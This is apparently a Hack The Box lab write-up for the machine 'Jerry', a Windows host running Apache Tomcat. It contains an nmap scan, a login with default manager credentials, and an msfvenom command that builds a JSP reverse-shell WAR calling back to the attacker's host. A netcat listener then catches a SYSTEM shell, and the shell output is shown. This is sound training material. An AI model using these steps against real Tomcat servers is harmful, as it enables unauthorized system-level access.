# HTB - Jerry
## OS - Windows

I started with an nmap scan of Jerry (IP address is 10.10.10.95).

```
$nmap -sC -sV -oN jerry.nmap 10.10.10.95
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-30 18:39 PST
Nmap scan report for 10.10.10.95
Host is up (0.11s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.50 seconds

```

Port 8080 is open and running Tomcat. It shows the default page for Tomcat. On the right side, I selected the "Manager App".

It asks for a login. I tried admin/admin and obviously it did not work. It showed a "403 access denied" page.


![Jerry-unauthorized](/images/jerry.png)

We see tomcat/s3cret somewhere in the middle of the page. 

We can login using this account and explore Tomcat manager. We see that we can upload our own war files.

![Jerry-Tomcat-Manager](/images/jerry-1.png)


Using msfvenom to upload a war file with reverse shell. 

```
$msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.28 LPORT=4444 -f war > jerry_shell.war
Payload size: 1091 bytes
Final size of war file: 1091 bytes

```

I uploaded this war file using Tomcat Manager. After that, I could see in the Manager that jerry_shell war had started.

To use this war file, I started a netcat listener on the attack host and browsed to http://10.10.10.95/jerry_shell. I saw that the shell started. 

The Tomcat is run with ntauthority/system privileges, so I got administrator access. Both the flags were in admin's desktop folder.

```
$nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.10.95] 49192
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\apache-tomcat-7.0.88

06/19/2018  03:07 AM    <DIR>          .
06/19/2018  03:07 AM    <DIR>          ..
06/19/2018  03:06 AM    <DIR>          bin
06/19/2018  05:47 AM    <DIR>          conf
06/19/2018  03:06 AM    <DIR>          lib
05/07/2018  01:16 PM            57,896 LICENSE
02/01/2021  02:00 AM    <DIR>          logs
05/07/2018  01:16 PM             1,275 NOTICE
05/07/2018  01:16 PM             9,600 RELEASE-NOTES
05/07/2018  01:16 PM            17,454 RUNNING.txt
06/19/2018  03:06 AM    <DIR>          temp
02/01/2021  02:09 AM    <DIR>          webapps
06/19/2018  03:34 AM    <DIR>          work
               4 File(s)         86,225 bytes
               9 Dir(s)  27,601,915,904 bytes free

C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system

C:\apache-tomcat-7.0.88>cd ../ 
cd ../

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\

06/19/2018  03:07 AM    <DIR>          apache-tomcat-7.0.88
08/22/2013  05:52 PM    <DIR>          PerfLogs
06/19/2018  05:42 PM    <DIR>          Program Files
06/19/2018  05:42 PM    <DIR>          Program Files (x86)
06/18/2018  10:31 PM    <DIR>          Users
06/19/2018  05:54 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  27,601,915,904 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users

06/18/2018  10:31 PM    <DIR>          .
06/18/2018  10:31 PM    <DIR>          ..
06/18/2018  10:31 PM    <DIR>          Administrator
08/22/2013  05:39 PM    <DIR>          Public
               0 File(s)              0 bytes
               4 Dir(s)  27,601,915,904 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator

06/18/2018  10:31 PM    <DIR>          .
06/18/2018  10:31 PM    <DIR>          ..
06/19/2018  05:43 AM    <DIR>          Contacts
06/19/2018  06:09 AM    <DIR>          Desktop
06/19/2018  05:43 AM    <DIR>          Documents
06/19/2018  05:43 AM    <DIR>          Downloads
06/19/2018  05:43 AM    <DIR>          Favorites
06/19/2018  05:43 AM    <DIR>          Links
06/19/2018  05:43 AM    <DIR>          Music
06/19/2018  05:43 AM    <DIR>          Pictures
06/19/2018  05:43 AM    <DIR>          Saved Games
06/19/2018  05:43 AM    <DIR>          Searches
06/19/2018  05:43 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  27,601,915,904 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:09 AM    <DIR>          flags
               0 File(s)              0 bytes
               3 Dir(s)  27,601,915,904 bytes free

C:\Users\Administrator\Desktop>cd flags	
cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)  27,601,915,904 bytes free

C:\Users\Administrator\Desktop\flags>type *txt
type *txt
user.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

root.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```



